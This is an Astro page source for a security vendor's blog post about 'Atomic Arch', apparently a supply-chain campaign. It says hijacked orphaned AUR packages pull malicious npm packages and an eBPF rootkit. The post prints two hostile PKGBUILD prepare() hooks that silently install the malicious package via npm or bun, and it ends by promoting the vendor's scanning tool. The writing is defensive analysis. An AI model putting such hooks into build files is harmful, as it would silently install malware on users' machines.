@@ -1,0 +1,291 @@
+---
+import Layout from '../../layouts/Layout.astro';
+---
+
+<Layout
+  title="Atomic Arch Targets Bun. The Entry Point Was AUR. &mdash; Commit"
+  description="1,500 Arch Linux packages hijacked to inject three malicious npm dependencies. Wave 2 adds Bun-specific install paths. The eBPF rootkit hides everything."
+  canonical="https://getcommit.dev/blog/atomic-arch-targets-bun/"
+  publishDate="2026-06-14"
+>
+
+  <!-- Nav -->
+  <nav>
+    <div class="container nav-inner">
+      <a href="/" class="nav-brand">Commit</a>
+      <ul class="nav-links">
+        <li><a href="/quickstart/">Quickstart</a></li>
+        <li><a href="/audit/">Audit</a></li>
+        <li><a href="/blog/" style="color: var(--ink);">Writing</a></li>
+        <li><a href="/pricing/">Pricing</a></li>
+        <li><a href="/docs/">Docs</a></li>
+        <li><a href="https://github.com/piiiico/proof-of-commitment" target="_blank" rel="noopener">GitHub</a></li>
+        <li><a href="mailto:pico@amdal.dev">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <!-- Essay -->
+  <article class="essay">
+    <div class="container">
+      <div class="editorial">
+
+        <!-- Header -->
+        <header class="essay-header">
+          <div class="essay-meta animate-in delay-1">
+            <time datetime="2026-06-14">June 14, 2026</time>
+          </div>
+          <h1 class="essay-title animate-in delay-2">Atomic Arch Targets Bun. The Entry Point Was AUR.</h1>
+          <p class="essay-subtitle animate-in delay-3">
+            1,500 Arch Linux packages hijacked to inject three malicious npm dependencies. Wave 2 adds Bun-specific install paths. The eBPF rootkit hides everything &mdash; except the npm registry record.
+          </p>
+          <p class="essay-byline animate-in delay-4">Pico</p>
+        </header>
+
+        <!-- Body -->
+        <div class="essay-body">
+
+          <p>
+            In mid-June, Sonatype flagged a campaign called Atomic Arch (Sonatype-2026-003775, CVSS 8.7). The headline numbers:
+            <a href="/blog/aur-1579-packages-adoption-bypass">1,579 compromised AUR packages</a>, three malicious npm dependencies
+            &mdash; <code>atomic-lockfile</code>, <code>js-digest</code>, <code>lockfile-js</code> &mdash; and an eBPF rootkit
+            persistent enough to survive reboots.
+          </p>
+
+          <p>
+            The ecosystem framing is easy to miss. This isn&rsquo;t an Arch Linux story. Arch users are the vector.
+            npm users are the target. And in Wave 2, Bun users specifically.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>1. The entry point is outside npm</h2>
+
+          <p>
+            Every major npm supply chain attack before Atomic Arch started inside npm: a stolen token, a typosquatted
+            package name, a compromised maintainer account. Atomic Arch is the first to use a completely separate
+            ecosystem &mdash; AUR &mdash; as the injection point.
+          </p>
+
+          <p>
+            AUR (Arch User Repository) is community-maintained. Unlike the official Arch repos, there&rsquo;s no formal
+            review process. When a maintainer abandons a package, it becomes &ldquo;orphaned&rdquo; &mdash; and any registered
+            user can adopt it, using the repository&rsquo;s standard workflow. Atomic Arch adopted orphaned packages at scale.
+            The modified PKGBUILDs add a <code>prepare()</code> hook that runs before the package builds:
+          </p>
+
+          <pre class="code-block"><code>prepare() {'{'}{'\n'}  npm install atomic-lockfile --save-optional 2>/dev/null || true{'\n'}{'}'}</code></pre>
+
+          <p>
+            <code>--save-optional</code> keeps it off the direct dependency list. <code>|| true</code> swallows errors silently.
+            A developer installing an orphaned AUR package for a seemingly unrelated system tool would never notice.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>2. Wave 2 targets Bun specifically</h2>
+
+          <p>
+            The initial wave used npm as the injection mechanism. Wave 2 modified the PKGBUILDs to detect which JavaScript
+            runtime is in PATH:
+          </p>
+
+          <pre class="code-block"><code>prepare() {'{'}{'\n'}  if command -v bun &>/dev/null; then{'\n'}    bun add atomic-lockfile --optional 2>/dev/null || true{'\n'}  else{'\n'}    npm install atomic-lockfile --save-optional 2>/dev/null || true{'\n'}  fi{'\n'}{'}'}</code></pre>
+
+          <p>
+            This is attacker threat modeling made explicit. Bun is fast enough that developers installing system tools from
+            AUR are likely running it. AI coding tools &mdash; Claude Code, Cursor, Windsurf &mdash; run on Bun. The developer
+            profile that installs from AUR is precisely the developer profile that has AI assistant credentials in their
+            environment.
+          </p>
+
+          <p>
+            The same packages, a different install path, a more targeted victim.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>3. The payload hides at kernel level</h2>
+
+          <p>
+            Once installed, <code>atomic-lockfile</code> drops an eBPF rootkit &mdash; same genus as
+            <a href="/blog/ironworm-rust-malware-targets-ai-credentials">IronWorm</a>, which appeared ten days earlier.
+            The rootkit hooks at <code>execve</code> and <code>openat</code> syscalls, making malicious processes invisible
+            to <code>ps</code>, <code>top</code>, and <code>ls</code>. It persists across reboots via systemd service injection.
+          </p>
+
+          <p>
+            The combination of AUR (no npm audit surface), <code>--save-optional</code> (not in lock files by default), and
+            an eBPF rootkit (invisible to process monitoring) means this sits undetected. No <code>npm audit</code>.
+            No <code>bun audit</code>. Nothing in <code>ps aux</code>.
+          </p>
+
+          <p>
+            What eBPF rootkits cannot hide: the npm registry record. The package exists. It has a history &mdash; or doesn&rsquo;t.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>What behavioral scoring shows</h2>
+
+          <p>
+            I ran all three Atomic Arch packages through <a href="/audit/">Commit&rsquo;s behavioral audit</a>:
+          </p>
+
+          <div class="essay-table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Package</th>
+                  <th>Score</th>
+                  <th>Downloads/wk</th>
+                  <th>Age</th>
+                  <th>Provenance</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr style="background: rgba(209, 77, 65, 0.07);">
+                  <td><code>atomic-lockfile</code></td>
+                  <td style="color: #D14D41; font-weight: 600;">12</td>
+                  <td>574</td>
+                  <td>unknown</td>
+                  <td>&mdash;</td>
+                </tr>
+                <tr>
+                  <td><code>js-digest</code></td>
+                  <td style="color: #D14D41; font-weight: 600;">null</td>
+                  <td>0</td>
+                  <td>unknown</td>
+                  <td>&mdash;</td>
+                </tr>
+                <tr style="background: rgba(209, 77, 65, 0.07);">
+                  <td><code>lockfile-js</code></td>
+                  <td style="color: #D14D41; font-weight: 600;">null</td>
+                  <td>0</td>
+                  <td>unknown</td>
+                  <td>&mdash;</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <p>
+            <code>atomic-lockfile</code> scores 12 &mdash; a package in the bottom percentile by every behavioral dimension:
+            longevity, publisher depth, release consistency. The other two score null: no history, no downloads,
+            no maintainer track record.
+          </p>
+
+          <p>
+            The AUR injection mechanism is clever. The npm registry record isn&rsquo;t. These packages have the exact profile
+            behavioral scoring was built to catch: no commitment, no history, no stake.
+          </p>
+
+          <hr class="essay-divider" />
+
+          <h2>The escalation pattern</h2>
+
+          <div class="essay-table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Date</th>
+                  <th>Attack</th>
+                  <th>New capability</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>May 11</td>
+                  <td>Shai-Hulud</td>
+                  <td>Self-propagating worm, 637 packages in 39 min</td>
+                </tr>
+                <tr style="background: rgba(209, 77, 65, 0.07);">
+                  <td>May 22</td>
+                  <td>TrapDoor</td>
+                  <td>Cross-ecosystem + AI assistant poisoning</td>
+                </tr>
+                <tr>
+                  <td>Jun 1</td>
+                  <td>Miasma</td>
+                  <td>Forged SLSA provenance on Red Hat packages</td>
+                </tr>
+                <tr style="background: rgba(209, 77, 65, 0.07);">
+                  <td>Jun 4</td>
+                  <td>IronWorm</td>
+                  <td>Rust + eBPF rootkit + AI credential theft</td>
+                </tr>
+                <tr>
+                  <td><strong>Jun 11&ndash;14</strong></td>
+                  <td><strong>Atomic Arch</strong></td>
+                  <td><strong>AUR-to-npm vector + Bun-specific targeting</strong></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <p>
+            Atomic Arch adds two capabilities the ecosystem hadn&rsquo;t seen combined: entry from outside npm&rsquo;s audit surface,
+            and runtime-specific branching to target Bun users. The attack isn&rsquo;t just escalating in volume &mdash;
+            it&rsquo;s mapping the ecosystem more precisely.
+          </p>
+
+          <p>Bun users now have a named threat model entry.</p>
+
+          <hr class="essay-divider" />
+
+          <h2>What to do</h2>
+
+          <p>
+            <strong>Check if any Atomic Arch packages are installed:</strong>
+          </p>
+
+          <pre class="code-block"><code>npx proof-of-commitment atomic-lockfile js-digest lockfile-js</code></pre>
+
+          <p>
+            <strong>Gate every install &mdash; including Bun installs.</strong> One command adds a behavioral check to
+            Cursor, Claude Code, and Windsurf:
+          </p>
+
+          <pre class="code-block"><code>npx proof-of-commitment hook</code></pre>
+
+          <p>
+            The hook intercepts <code>npm install</code>, <code>bun add</code>, <code>pip install</code>,
+            <code>cargo add</code>, and <code>go get</code>. Packages with no behavioral history get blocked before
+            execution. This is the only check that runs before the payload does.
+          </p>
+
+          <p>
+            <strong>If you&rsquo;re on Arch Linux and install from AUR:</strong> audit recently-adopted packages.
+            AUR orphan adoption is public &mdash; the adoption timestamp is on the package page. A package recently
+            adopted by an unknown maintainer after years of abandonment is worth reviewing before you build.
+          </p>
+
+          <p>
+            <strong>Audit your current Bun project:</strong>
+          </p>
+
+          <pre class="code-block"><code>npx proof-of-commitment --file bun.lockb</code></pre>
+
+          <p>
+            The eBPF rootkit hides processes. It doesn&rsquo;t hide the package from the registry.
+            That&rsquo;s the gap behavioral scoring covers &mdash; before the first install, not after.
+          </p>
+
+          <div class="essay-cta">
+            <a href="/audit/" class="btn-primary">Audit your dependencies &rarr;</a>
+            <a href="/get-started/" class="btn-ghost">Get free API key &rarr;</a>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <!-- Footer -->
+  <footer>
+    <div class="container">
+      <p><a href="/">Commit</a> &middot; Supply chain trust, measured behaviorally. <a href="/audit/">Audit</a> &middot; <a href="/rankings/">Rankings</a> &middot; <a href="/blog/">Writing</a> &middot; <a href="https://github.com/piiiico/proof-of-commitment">GitHub</a></p>
+    </div>
+  </footer>
+
+</Layout>
